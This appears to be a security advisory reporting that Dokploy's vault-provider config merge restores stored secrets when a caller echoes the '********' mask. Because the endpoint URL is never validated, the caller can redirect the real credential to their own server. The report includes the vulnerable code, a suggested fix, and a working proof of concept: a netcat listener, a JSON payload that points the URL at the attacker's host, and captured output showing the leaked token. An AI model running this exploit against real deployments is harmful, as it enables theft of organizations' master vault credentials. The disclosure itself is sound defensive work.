repo.description:
### Summary

A user holding a delegated `vaultProvider` role can exfiltrate the organization's external secret-store credential (HashiCorp Vault token, Infisical machine-identity client secret, Scaleway secret key) to a server they control.

Vault secrets are write-only by design: the read path replaces them with a mask. That mask is the **constant string `********`**, and the config merge restores the real stored secret whenever an incoming config carries it. The merge validates only that `providerType` is unchanged - it never validates the endpoint URL, which sits in the same object and is fully caller-controlled. Echo the mask, change the URL, and Dokploy sends the real credential to the attacker's host.

Introduced with the vault subsystem on 2026-08-10, first shipped in `v0.30.0`. Not covered by any existing advisory.

### Details

`packages/server/src/services/vault-provider.ts:16` - the mask is a constant:

```ts
export const VAULT_SECRET_MASK = "********";
```

`:28-38` - every read stamps that same constant, so the caller learns it for free:

```ts
export const maskVaultProviderConfig = (config) => {
  const masked = { ...config };
  for (const field of SENSITIVE_FIELDS[config.providerType]) {
    if (masked[field]) masked[field] = VAULT_SECRET_MASK;
  }
  return masked;
};
```

`:40-58` - the merge restores the real secret, validating only the provider type:

```ts
export const mergeVaultProviderConfig = (incoming, existing) => {
  const merged = { ...incoming };
  for (const field of SENSITIVE_FIELDS[incoming.providerType]) {
    if (merged[field] === VAULT_SECRET_MASK) {          // attacker-supplied sentinel
      if (incoming.providerType !== existing.providerType) throw new TRPCError({...});
      merged[field] = existing[field];                   // real stored secret
    }
  }
  return merged;                                         // `url` came straight from `incoming`
};
```

Every provider schema carries a caller-settable destination (`packages/server/src/db/schema/vault-provider.ts`): hashicorp `url` (:18), infisical `siteUrl` (:26), aws `endpoint` (:39), azure `vaultUri` (:51), scaleway `apiUrl` (:62).

The sink has no egress restriction - `packages/server/src/utils/vault/types.ts:13-18`:

```ts
export const vaultFetch = async (url: string, init: RequestInit = {}) =>
  await fetch(url, { ...init, signal: AbortSignal.timeout(VAULT_REQUEST_TIMEOUT_MS) });
```

A grep for `isPrivate|localhost|allowlist|validateUrl|ssrf` under `utils/vault/` returns nothing. The credential goes straight into the outbound request - `utils/vault/hashicorp.ts:20-28, 79-89`:

```ts
const buildHeaders = (config) => ({ "X-Vault-Token": config.token, ... });

async testConnection(config) {
  const response = await vaultFetch(`${baseUrl(config)}/v1/auth/token/lookup-self`,
    { headers: buildHeaders(config) });
```

Infisical is worse in shape - `utils/vault/infisical.ts:9-33` POSTs `clientSecret` in the request **body** to `${config.siteUrl}/api/v1/auth/universal-auth/login`.

**Reachability.** `apps/dokploy/server/api/routers/vault-provider.ts:102-125` - `testConnection` is gated by `withPermission("vaultProvider", "create")` and accepts both a `vaultProviderId` and a full `config`, taking the merge branch when `config` is supplied:

```ts
config = config ? mergeVaultProviderConfig(config, provider.config) : provider.config;
```

`update` (`:43-63`) performs the same merge and **persists** it, so the redirect survives: every later deploy resolving a `${{vault.NAME.ref}}` reference re-sends the credential (`utils/vault/index.ts:103-104`).

Organization scoping is correctly enforced (`findVaultProviderInOrganization`, `services/vault-provider.ts:146-158`) - this is an intra-organization role-boundary break, not cross-tenant.

**Suggested fix.** Don't round-trip the secret through the client: if a sensitive field equals the mask, ignore it and load the stored value server-side, or key the "keep existing secret" decision on an explicit boolean rather than a client-suppliable magic string. Additionally, if the merge restores a secret, require the endpoint URL to be unchanged - the same rule you already apply to `providerType`. Worth noting you removed the equivalent caller-settable endpoint from the DNS sibling in `02edd6ab` (2026-08-12, *"remove Route53 endpoint override"*), which deleted `endpoint: z.string().trim().url().optional()` from `db/schema/dns-provider.ts`; all five vault schemas still have theirs.

### PoC

On any instance, as a user with a role granting `vaultProvider` `create` (or `update`):

1. Create a `hashicorp` vault provider with a real token and any `url`.
2. Read it back (`vaultProvider.one`, or just open the settings UI). The `token` field returns as the literal string `********`; `url` returns real.
3. Start a listener you control: `nc -lk 9931`
4. Call `vaultProvider.testConnection` with the id **and** a config that echoes the mask while changing the URL:

```json
{
  "vaultProviderId": "<id from step 1>",
  "config": {
    "providerType": "hashicorp",
    "url": "http://<your-host>:9931",
    "token": "********",
    "mount": "secret"
  }
}
```

5. The listener receives the real stored token:

```
GET /v1/auth/token/lookup-self HTTP/1.1
X-Vault-Token: <the REAL token stored in step 1>
```

Substituting `vaultProvider.update` for `testConnection` performs the same merge and persists the attacker's URL.

I also confirmed this directly against your own `mergeVaultProviderConfig`, `maskVaultProviderConfig` and `hashicorpClient`, imported unmodified from a clone at `v0.30.2` (only `db`, `@trpc/server` and `drizzle-orm` stubbed so the module loads):

```
=== CONTROL 1: what the read path hands the caller ===
  token returned to client : "********"

=== CONTROL 2: caller supplies a REAL token (not the mask) ===
  merged token = attacker-own-token
  -> substitution did NOT fire
  [attacker] X-Vault-Token: attacker-own-token

=== EXPLOIT: caller echoes the mask AND points url at their own host ===
  merged token = hvs.REAL-ORG-VAULT-TOKEN-zt9f3a1c
  merged url   = http://127.0.0.1:9931
  [attacker] X-Vault-Token: hvs.REAL-ORG-VAULT-TOKEN-zt9f3a1c
```

Control 2 is the important one: same request shape, same destination, same code path - the only variable is whether the token field equals the mask constant, and only one of the two runs causes the stored secret to be substituted. That isolates the mask-echo as the cause rather than the URL.

### Impact

Credential exfiltration (CWE-522) composed with an unvalidated outbound destination (CWE-918).

The leaked HashiCorp token or Infisical client secret is the master credential for everything the organization stores in that vault - including secrets belonging to projects the attacker cannot see inside Dokploy. Using `update` makes the redirect durable, so the credential is re-sent on every subsequent deploy that resolves a vault reference.

This defeats the subsystem's own stated invariant, written in-tree at `packages/server/src/lib/access-control.ts:203`: *"Members need provider/secret names for env editor autocomplete; values are never exposed."* The masking exists precisely so a delegated secrets-manager role can reconfigure a provider without learning its credential.

**Who is affected:** self-hosted organizations that use vault providers and delegate `vaultProvider` `create`/`update` through a custom role. The static `member` role holds `vaultProvider: ["read"]` only (`access-control.ts:204`), so this is not the default member - it is specifically the delegated role the mask exists to constrain. Azure and AWS are partially mitigated: Azure's token endpoint is hardcoded to `login.microsoftonline.com` (`utils/vault/azure.ts:18-19`) so only the derived bearer token leaks, and AWS uses SigV4 so only the access key id plus a signature leak. HashiCorp, Infisical and Scaleway leak the full credential.
repo.summary: Vault provider credential exfiltration: echoing the "********" mask restores the stored secret, which is then sent to a caller-controlled endpoint URL
